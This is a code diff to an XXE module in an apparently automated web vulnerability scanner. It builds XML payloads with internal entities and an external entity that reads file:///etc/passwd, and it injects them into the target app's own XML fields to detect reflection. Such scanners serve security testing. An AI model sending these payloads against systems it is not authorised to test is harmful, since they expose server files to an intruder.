@@ -44,6 +44,9 @@ class XXEModule(_Module):
         ctype = ip.content_type or "application/xml"
         return http.post(ip.url, body=xml, headers={"Content-Type": ctype}, cache=False)
 
+    # a leaf element: <tag ...>text-without-tags</tag>  (e.g. <X-Token>..</X-Token>)
+    _LEAF_RE = re.compile(r'(<([A-Za-z_][\w:.\-]*)\b[^>]*>)([^<]*)(</\2>)')
+
     def probe(self, http, ip):
         if not self.requires(ip):
             return []
@@ -55,20 +58,24 @@ class XXEModule(_Module):
         base_txt = base.text or ""
         base_root = bool(_XXE_PASSWD_ROOT_RE.search(base_txt))
 
-        # class 1: internal entity expansion
-        doc_expand = (f'<?xml version="1.0"?>'
-                      f'<!DOCTYPE r [<!ENTITY {ent} "{token}">]>'
-                      f'<r>&{ent};</r>')
-        r1 = self._send(http, ip, doc_expand)
-        expanded = token in (r1.text or "") and f"&{ent};" not in (r1.text or "")
+        # class 1: internal entity expansion — try a generic doc AND the app's
+        # own XML shape (the entity ref is placed inside leaf elements like
+        # <X-Token>, which is what reflection-based apps actually echo back).
+        expanded, expand_payload, expand_status = False, None, None
+        for doc in self._docs(ip.body or "", ent, f'"{token}"'):
+            r = self._send(http, ip, doc)
+            t = r.text or ""
+            if token in t and f"&{ent};" not in t:
+                expanded, expand_payload, expand_status = True, doc, r.status
+                break
         if expanded:
             sigs.append(Signal(
                 self.vuln, "internal-entity-expand", "xxe.entity_expand",
                 SignalStrength.STRONG,
                 "XML parser expanded a custom internal entity",
-                {"payload": doc_expand, "status": r1.status}))
+                {"payload": expand_payload, "status": expand_status}))
 
-        # class 2: external entity file read (generic doc, then original body)
+        # class 2: external entity file read
         file_hit = self._file_read(http, ip, ent, base_root)
         if file_hit:
             payload, status = file_hit
@@ -84,34 +91,43 @@ class XXEModule(_Module):
         return sigs
 
     def _file_read(self, http, ip, ent, base_root):
-        docs = [
-            (f'<?xml version="1.0"?>'
-             f'<!DOCTYPE r [<!ENTITY {ent} SYSTEM "file:///etc/passwd">]>'
-             f'<r>&{ent};</r>'),
-        ]
-        original = self._inject_original(ip.body or "", ent)
-        if original:
-            docs.append(original)
-        for doc in docs:
+        for doc in self._docs(ip.body or "", ent, 'SYSTEM "file:///etc/passwd"'):
             r = self._send(http, ip, doc)
             if (not base_root) and _XXE_PASSWD_ROOT_RE.search(r.text or ""):
                 return doc, r.status
         return None
 
-    @staticmethod
-    def _inject_original(body, ent):
-        """Best-effort: reuse the app's own XML shape — prepend a DOCTYPE with
-        an external entity right after the XML declaration and reference &ent;
-        in the first text node (falls back to appending an element)."""
-        if not body.strip():
-            return None
-        doctype = (f'<!DOCTYPE r [<!ENTITY {ent} SYSTEM "file:///etc/passwd">]>')
-        m = re.match(r"\s*<\?xml[^>]*\?>", body)
-        head, rest = (body[:m.end()], body[m.end():]) if m else ("", body)
-        injected, n = re.subn(r">([^<>]*)<", f">&{ent};<", rest, count=1)
-        if n == 0:
-            injected = rest + f"<r>&{ent};</r>"
-        return head + doctype + injected
+    @classmethod
+    def _docs(cls, body, ent, decl):
+        """Build the payloads to try for one entity declaration `decl` (either
+        an internal value like '"TOK.."' or 'SYSTEM "file:///etc/passwd"').
+
+        Order matters — most-likely-to-reflect first:
+          1. the app's own XML with &ent; injected into EVERY leaf element,
+          2. the same but only the LAST leaf (if multi-inject upsets a strict
+             parser/validator),
+          3. a generic <r>&ent;</r> doc as a last resort.
+        """
+        doctype = f'<!DOCTYPE r [<!ENTITY {ent} {decl}>]>'
+        docs = []
+        body = body or ""
+        if body.strip():
+            m = re.match(r"\s*<\?xml[^>]*\?>", body)
+            head, rest = (body[:m.end()], body[m.end():]) if m else ("", body)
+            matches = list(cls._LEAF_RE.finditer(rest))
+            if matches:
+                inj_all = cls._LEAF_RE.sub(
+                    lambda g: g.group(1) + f"&{ent};" + g.group(4), rest)
+                docs.append(head + doctype + inj_all)
+                if len(matches) > 1:
+                    last = matches[-1]
+                    inj_last = (rest[:last.start()] + last.group(1) + f"&{ent};"
+                                + last.group(4) + rest[last.end():])
+                    docs.append(head + doctype + inj_last)
+            else:
+                docs.append(head + doctype + rest + f"<r>&{ent};</r>")
+        docs.append(f'<?xml version="1.0"?>{doctype}<r>&{ent};</r>')
+        return docs
 
 
 def phase_xxe(target, config, runner):
